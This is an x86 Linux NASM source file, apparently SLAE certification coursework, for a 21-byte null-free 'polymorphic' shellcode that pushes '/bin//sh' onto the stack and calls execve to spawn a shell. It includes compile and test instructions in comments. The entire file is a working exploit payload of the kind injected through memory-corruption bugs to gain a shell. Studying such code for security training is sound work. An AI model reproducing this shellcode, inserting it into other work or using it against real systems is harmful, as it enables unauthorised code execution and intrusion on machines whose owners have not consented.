; Filename: execve_bin_sh_polymorphic.nasm
; Author: Upayan a.k.a. slaeryan
; SLAE: 1525
; Contact: upayansaha@icloud.com
; Purpose: This is a x86 Linux null-free polymorphic shellcode for spawning /bin/sh
; Testing: ./execve_bin_sh_polymorphic
; Compile with: ./compile.sh execve_bin_sh_polymorphic
; Size of shellcode: 21 bytes

global _start

section .text
_start:

    xor eax, eax           ; Clearing out EAX register
	xor ecx, ecx           ; Clearing out ECX regsiter
	push eax               ; push for NULL termination
	push dword 0x68732f2f  ; push //sh
	push dword 0x6e69622f  ; push /bin
	mov ebx, esp           ; store address of TOS - /bin//sh
	mov al, 0x0b           ; store Syscall number for execve() = 11 OR 0x0b in AL
	int 0x80               ; Execute the system call 
